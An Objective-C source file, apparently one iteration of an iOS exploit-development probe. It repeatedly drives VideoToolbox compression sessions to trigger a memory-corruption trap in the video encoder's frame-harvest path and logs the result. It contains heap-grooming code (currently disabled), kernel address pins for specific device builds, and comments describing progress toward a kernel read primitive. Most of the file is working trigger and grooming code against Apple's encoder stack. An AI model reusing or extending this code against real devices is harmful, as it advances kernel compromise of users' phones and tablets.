//
//  P087ReclaimObserver.m — see .h. v10: WINDOW THRESHOLD. v9 answered the
//  confound: ONE session, ZERO idle clients, still traps — on BOTH SKUs.
//  The corruption is intra-session, and the trigger shape is now visible:
//  EncodeFrame accepts ~3 frames, then BLOCKS because no completion ever
//  arrives (v7 monitor + v9 log: zero deltas ever), the blocked submit makes
//  vtcsr harvest pending frames (dequeueAllPendingFrames...), and THAT
//  harvest PAC-traps in CFRelease on a repurposed frame object.
//  v10 tests the window threshold: ONE frame submitted. If the in-flight
//  window never fills, the harvest should never run:
//  TRAP at 1 frame   = harvest runs during normal submission — corruption
//                      is immediate, no window involved.
//  SURVIVE + no completion in 30s = the harvest is window-triggered AND the
//                      firmware session is wedged from creation (completions
//                      never come) — the trap is a symptom of the wedge.
//

#import "P087ReclaimObserver.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <VideoToolbox/VideoToolbox.h>
#import <CoreVideo/CoreVideo.h>
#import <CoreMedia/CoreMedia.h>
#import <fcntl.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>
#import <os/lock.h>

#define P087_BUILD              @"p087-reclaim-observer-v10"
#define P087_W                  640
#define P087_H                  360
#define P087_SESSIONS           1   /* v8: mechanism bound — unchanged since */
#define P087_GROOM              0   /* v9: confound isolation — stays OFF */
#define P087_FRAMES             1   /* v10: window threshold — was 6 */
#define P087_SETTLE_US          200000
#define P087_WAIT_SEC           30  /* v10: long wait — does ANY completion arrive? */
#define P087_REFILL             8
#define P087_SETTLE_US          200000

typedef struct {
    int idx;                    /* owning session index (race) or 100+refill */
    int32_t invalidated;
    int32_t submitted;
    int32_t completions;
    int32_t late;
    int32_t foreignPts;         /* PTS outside submitted range */
    int32_t dupPts;             /* same PTS delivered twice */
    int32_t lastPtsTicks;
    int phase;                  /* 0=live, 1=invalidated */
    CMVideoCodecType codec;
} P087Ctx;

static NSMutableString *g_log = nil;
static int g_fd = -1;
static int g_pbFails = 0;          /* v3: pixel-buffer allocation failures */
static int g_pbLastErr = 0;        /* v3: last CVReturn seen */
static int g_encTimeouts = 0;      /* v3: refill encodes still blocked at wait end */
static os_unfair_lock g_llock = OS_UNFAIR_LOCK_INIT; /* v7: callbacks + in-flight monitor log concurrently */
static void L(NSString *s) {
    if (!g_log) return;
    os_unfair_lock_lock(&g_llock);
    NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_log appendString:out];
    if (g_fd >= 0) {
        const char *p = out.UTF8String;
        if (p) { write(g_fd, p, strlen(p)); fcntl(g_fd, F_FULLFSYNC); }
    }
    os_unfair_lock_unlock(&g_llock);
}

static void P087Callback(void *userData, void *srcRefCon, OSStatus status,
                         VTEncodeInfoFlags flags, CMSampleBufferRef sb)
{
    (void)srcRefCon; (void)flags;
    P087Ctx *c = (P087Ctx *)userData;
    __atomic_add_fetch(&c->completions, 1, __ATOMIC_RELAXED);
    int wasInvalidated = __atomic_load_n(&c->invalidated, __ATOMIC_RELAXED);
    if (wasInvalidated) __atomic_add_fetch(&c->late, 1, __ATOMIC_RELAXED);

    if (sb) {
        CMTime pts = CMSampleBufferGetPresentationTimeStamp(sb);
        int64_t ticks = CMTimeGetSeconds(pts) * 30.0 + 0.5; /* 30fps grid */
        int32_t p = (int32_t)ticks;
        int32_t prev = __atomic_load_n(&c->lastPtsTicks, __ATOMIC_RELAXED);
        int32_t submitted = __atomic_load_n(&c->submitted, __ATOMIC_RELAXED);
        /* Idle groom (idx>=100, submitted==0) getting a buffer is the
           cross-client delivery we are hunting. Flush before CFRelease. */
        if (c->idx >= 100 && submitted == 0) {
            L([NSString stringWithFormat:@"  [CROSS-CLIENT] idle groom sess %d got pts=%d status=%d — drain delivered to a session that never encoded",
                c->idx, p, (int)status]);
        }
        if (wasInvalidated && (p < 0 || p >= submitted)) {
            __atomic_add_fetch(&c->foreignPts, 1, __ATOMIC_RELAXED);
            L([NSString stringWithFormat:@"  [FOREIGN-PTS] sess %d: pts=%d submitted=%d invalidated=%d",
                c->idx, p, submitted, wasInvalidated]);
        }
        if (prev != -1 && prev == p) {
            __atomic_add_fetch(&c->dupPts, 1, __ATOMIC_RELAXED);
            L([NSString stringWithFormat:@"  [DUP-PTS] sess %d: pts=%d delivered twice",
                c->idx, p]);
        }
        __atomic_store_n(&c->lastPtsTicks, p, __ATOMIC_RELAXED);
        CFRelease(sb);
    }
    if (status != noErr) {
        L([NSString stringWithFormat:@"  [ERR] sess %d: status=%d", c->idx, (int)status]);
    }
}

static CVReturn P087MakePB(CVPixelBufferRef *out)
{
    NSDictionary *attrs = @{ (NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{} };
    return CVPixelBufferCreate(NULL, P087_W, P087_H,
        kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
        (__bridge CFDictionaryRef)attrs, out);
}

static VTCompressionSessionRef P087MakeSession(CMVideoCodecType codec, P087Ctx *ctx)
{
    VTCompressionSessionRef s = NULL;
    OSStatus st = VTCompressionSessionCreate(NULL, P087_W, P087_H, codec,
        NULL, NULL, NULL, P087Callback, ctx, &s);
    if (st != noErr || !s) return NULL;
    NSDictionary *props = @{
        (__bridge NSString *)kVTCompressionPropertyKey_AverageBitRate: @800000,
    };
    VTSessionSetProperties(s, (__bridge CFDictionaryRef)props);
    st = VTCompressionSessionPrepareToEncodeFrames(s);
    if (st != noErr) { VTCompressionSessionInvalidate(s); CFRelease(s); return NULL; }
    return s;
}

static int P087Submit(VTCompressionSessionRef s, P087Ctx *ctx, int f)
{
    CVPixelBufferRef pb = NULL;
    CVReturn cvr = P087MakePB(&pb);
    if (cvr != kCVReturnSuccess) {
        /* v3: every PB failure is counted + the first one logged verbatim.
           24 silent failures masked the fabric-death in v2. */
        __atomic_add_fetch(&g_pbFails, 1, __ATOMIC_RELAXED);
        __atomic_store_n(&g_pbLastErr, (int)cvr, __ATOMIC_RELAXED);
        if (__atomic_load_n(&g_pbFails, __ATOMIC_RELAXED) == 1) {
            L([NSString stringWithFormat:@"  [PB-FAIL] first failure cvr=%d (sess %d frame %d) — CoreVideo/IOSurface fabric degraded, see verdict",
                (int)cvr, ctx->idx, f]);
        }
        return 0;
    }
    if (CVPixelBufferLockBaseAddress(pb, 0) == kCVReturnSuccess) {
        memset(CVPixelBufferGetBaseAddress(pb), 0x7F, CVPixelBufferGetDataSize(pb));
        CVPixelBufferUnlockBaseAddress(pb, 0);
    }
    __atomic_add_fetch(&ctx->submitted, 1, __ATOMIC_RELAXED);
    OSStatus st = VTCompressionSessionEncodeFrame(s, pb,
        CMTimeMake(f, 30), CMTimeMake(1, 30), NULL, NULL, NULL);
    CVPixelBufferRelease(pb);
    return st == noErr;
}

@implementation P087ReclaimObserver

+ (NSString *)tap {
    g_log = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    g_fd = open([[docs stringByAppendingPathComponent:@"p087_reclaim_observer_log.txt"] UTF8String],
                O_CREAT | O_WRONLY | O_TRUNC, 0644);

    L([NSString stringWithFormat:@"=== p087 session %@ BUILD %@ ===",
        LabLocalMilitaryNow(), P087_BUILD]);
    L(@"v10 WINDOW THRESHOLD: v9 trapped with ONE session and ZERO idle clients");
    L(@"on both SKUs — corruption is intra-session. Shape: EncodeFrame accepts");
    L(@"~3 frames, then BLOCKS (zero completions ever arrive), the blocked submit");
    L(@"makes vtcsr harvest pending frames, and the harvest PAC-traps in");
    L(@"CFRelease on a repurposed frame object. v10: ONE frame, 30s wait.");
    L(@"TRAP at 1 frame = harvest runs during normal submission (no window needed).");
    L(@"SURVIVE + zero completions in 30s = harvest is window-triggered AND the");
    L(@"firmware session wedges at creation — completions NEVER come.");
    L(@"Waiter: kalloc-type client (alloc 0x7c00890 / free 0x7c008d0), one per session.");
    L(@"Dual SKU: A14 23F77 and A12X 23G71. 23G71 AVE pins: close 0x83a4cf0 stop 0x83a3dd0 send 0x83a4fd8.");
    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p087"];
    if (stop) {
        L(stop);
        if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); }
        return g_log;
    }
    L([LabDeviceProfile identBlock]);

    /* ---- v3 PRE-FLIGHT: one CVPixelBufferCreate before anything else.
       v2 burned a whole cycle learning the fabric was dead. If this fails,
       the boot is degraded — REBOOT and re-tap, do not continue. ---- */
    {
        CVPixelBufferRef pb = NULL;
        CVReturn cvr = P087MakePB(&pb);
        if (cvr != kCVReturnSuccess || !pb) {
            L([NSString stringWithFormat:@"[PRE-FLIGHT FAIL] CVPixelBufferCreate cvr=%d — IOSurface/CoreVideo fabric degraded on this boot.", (int)cvr]);
            L(@"[-] ABORT: reboot the device and re-tap. Do not run the race on a dead fabric.");
            if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); }
            return g_log;
        }
        CFRelease(pb);
        L(@"[pre-flight] CVPixelBufferCreate OK — fabric alive");
    }

    /* ---- PRE-GROOM (v9: COMPILED OUT — P087_GROOM 0).
       v4-v8 always carried 8 idle sessions; v9 removes them so session
       count is no longer a confound. Restore via #define P087_GROOM 1. ---- */
#if P087_GROOM
    P087Ctx *gctx = calloc(P087_REFILL, sizeof(P087Ctx));
    VTCompressionSessionRef *gsess = calloc(P087_REFILL, sizeof(VTCompressionSessionRef));
    CMVideoCodecType gcodecs[P087_REFILL] = {
        kCMVideoCodecType_H264, kCMVideoCodecType_HEVC,
        kCMVideoCodecType_H264, kCMVideoCodecType_HEVC,
        kCMVideoCodecType_H264, kCMVideoCodecType_HEVC,
        kCMVideoCodecType_H264, kCMVideoCodecType_HEVC };
    int groomOK = 0;
    for (int s = 0; s < P087_REFILL; s++) {
        gctx[s].idx = 100 + s;
        gctx[s].lastPtsTicks = -1;
        gctx[s].codec = gcodecs[s];
        gsess[s] = P087MakeSession(gcodecs[s], &gctx[s]);
        if (gsess[s]) groomOK++;
        L([NSString stringWithFormat:@"[groom %d] %@ prepared IDLE (no encodes)",
            100 + s, gsess[s] ? @"OK" : @"FAIL"]);
    }
    L([NSString stringWithFormat:@"[groom] %d/%d idle sessions live BEFORE flood", groomOK, P087_REFILL]);
#else
    L(@"[groom] DISABLED (v9) — single session, zero idle clients");
#endif

    /* ---- CONTROL FLOOD only. v4 proved invalidates are not required.
       Phase 2 never ran on this iPad — skip it so one tap = one question. ---- */
    P087Ctx *cctx = calloc(P087_SESSIONS, sizeof(P087Ctx));
    __block VTCompressionSessionRef *csess = calloc(P087_SESSIONS, sizeof(VTCompressionSessionRef));
    CMVideoCodecType ccodecs[P087_SESSIONS] = {
        kCMVideoCodecType_H264 };
    for (int s = 0; s < P087_SESSIONS; s++) {
        cctx[s].idx = s;
        cctx[s].lastPtsTicks = -1;
        cctx[s].codec = ccodecs[s];
        csess[s] = P087MakeSession(ccodecs[s], &cctx[s]);
        L([NSString stringWithFormat:@"[ctl sess %d] %@ prepared", s, csess[s] ? @"OK" : @"FAIL"]);
    }
    {
        dispatch_group_t cg = dispatch_group_create();
        dispatch_queue_t cq = dispatch_queue_create("com.p007.p087.control", DISPATCH_QUEUE_CONCURRENT);
        __block int csubmitted = 0;
        /* ---- v7 IN-FLIGHT OBSERVER ----
           v5/v6 read all counters AFTER the group wait; the trap killed the
           process first, so the log ended at the last submit line. This timer
           polls every counter every 200ms and flushes each delta immediately.
           Even if the drain traps mid-tick, every delta up to that instant is
           already on disk. groom>0 at ANY tick = CROSS-CLIENT, captured alive. */
        /* Block captures cannot reference C arrays — snapshot buffers live on
           the heap; the pointers are captured by value and stay stable. */
        __block int *prevCtl = calloc(P087_SESSIONS, sizeof(int));
#if P087_GROOM
        __block int *prevGroom = calloc(P087_REFILL, sizeof(int));
#endif
        dispatch_queue_t mq = dispatch_queue_create("com.p007.p087.monitor", DISPATCH_QUEUE_SERIAL);
        dispatch_source_t timer = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER, 0, 0, mq);
        dispatch_source_set_timer(timer, dispatch_time(DISPATCH_TIME_NOW, 200 * NSEC_PER_MSEC),
            200 * NSEC_PER_MSEC, 0);
        dispatch_source_set_event_handler(timer, ^{
            for (int s = 0; s < P087_SESSIONS; s++) {
                int c = __atomic_load_n(&cctx[s].completions, __ATOMIC_RELAXED);
                if (c != prevCtl[s]) {
                    L([NSString stringWithFormat:@"[tick ctl %d] completions=%d", s, c]);
                    prevCtl[s] = c;
                }
            }
            #if P087_GROOM
            for (int s = 0; s < P087_REFILL; s++) {
                int c = __atomic_load_n(&gctx[s].completions, __ATOMIC_RELAXED);
                if (c != prevGroom[s]) {
                    L([NSString stringWithFormat:@"[tick CROSS-CLIENT] groom %d completions=%d — delivered IN-FLIGHT, captured before any trap",
                        100 + s, c]);
                    prevGroom[s] = c;
                }
            }
#endif
        });
        dispatch_resume(timer);
        L(@"[flood] submitting — per-frame lines follow");
        for (int s = 0; s < P087_SESSIONS; s++) {
            if (!csess[s]) continue;
            dispatch_group_async(cg, cq, ^{
                for (int f = 0; f < P087_FRAMES; f++) {
                    /* v6: deterministic submit trail — v5 showed the trap fires
                       while encodes are still in flight, so the last line on
                       disk is our ground truth for how far submission got. */
                    L([NSString stringWithFormat:@"[ctl sess %d] frame %d submit", s, f]);
                    if (P087Submit(csess[s], &cctx[s], f))
                        __atomic_add_fetch(&csubmitted, 1, __ATOMIC_RELAXED);
                    else
                        L([NSString stringWithFormat:@"[ctl sess %d] frame %d ENCODE-FAIL", s, f]);
                }
                L([NSString stringWithFormat:@"[ctl sess %d] all frames submitted", s]);
            });
        }
        L(@"[wait] dispatch_group_wait 30s started — v10: ONE frame; if the window never fills, the harvest should never run");
        dispatch_group_wait(cg, dispatch_time(DISPATCH_TIME_NOW, P087_WAIT_SEC * NSEC_PER_SEC));
        dispatch_source_cancel(timer);
        L([NSString stringWithFormat:@"[wait] returned — submitted=%d (of %d) — completions recorded: see [tick] lines above",
            csubmitted, P087_SESSIONS * P087_FRAMES]);
        if (csubmitted > 0 &&
            __atomic_load_n(&cctx[0].completions, __ATOMIC_RELAXED) == 0) {
            L(@"[**] frame accepted (EncodeFrame returned) but ZERO completions in 30s —");
            L(@"[**] the firmware session is wedged from creation. The trap is downstream of this wedge.");
        }
    }
    usleep(3 * P087_SETTLE_US * 5);

    int cLate = 0, cForeign = 0, cDup = 0, cComp = 0, gComp = 0;
    for (int s = 0; s < P087_SESSIONS; s++) {
        L([NSString stringWithFormat:@"[ctl sess %d] completions=%d late=%d foreignPTS=%d dupPTS=%d",
            s, cctx[s].completions, cctx[s].late, cctx[s].foreignPts, cctx[s].dupPts]);
        cLate += cctx[s].late; cForeign += cctx[s].foreignPts;
        cDup += cctx[s].dupPts; cComp += cctx[s].completions;
    }
    #if P087_GROOM
    for (int s = 0; s < P087_REFILL; s++) {
        L([NSString stringWithFormat:@"[groom %d] completions=%d (must be 0 if no cross-client)",
            100 + s, gctx[s].completions]);
        gComp += gctx[s].completions;
    }
#endif
    L([NSString stringWithFormat:@"=== VERDICT ctlComp=%d groomComp=%d late=%d foreignPTS=%d dupPTS=%d pbFails=%d ===",
        cComp, gComp, cLate, cForeign, cDup, g_pbFails]);
    if (gComp) {
        L(@"[**] CROSS-CLIENT — idle groom received a completion it never submitted.");
        L(@"[**] Waiter-zone confusion is live. Not hasKread.");
    } else if (cLate || cForeign || cDup) {
        L(@"[**] CONTROL ANOMALOUS, grooms silent — drain confused but did not land on idle waiters.");
    } else if (cComp > 0 && !gComp) {
        L(@"[-] completions delivered normally, grooms silent — if a [tick] line above shows");
        L(@"[-] groom deltas in-flight but the counter reads 0 here, the trap beat the verdict.");
    } else {
        L(@"[-] clean — no cross-client, no PTS anomalies. Trap-only result if you are reading this after a recover.");
    }
    L(@"=== HONESTY === CROSS-CLIENT / anomalies = ladder evidence, NOT hasKread.");

    for (int s = 0; s < P087_SESSIONS; s++) {
        if (csess[s]) { VTCompressionSessionInvalidate(csess[s]); CFRelease(csess[s]); }
    }
    #if P087_GROOM
    for (int s = 0; s < P087_REFILL; s++) {
        if (gsess[s]) { VTCompressionSessionInvalidate(gsess[s]); CFRelease(gsess[s]); }
    }
#endif
    if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); }
    return g_log;
}

@end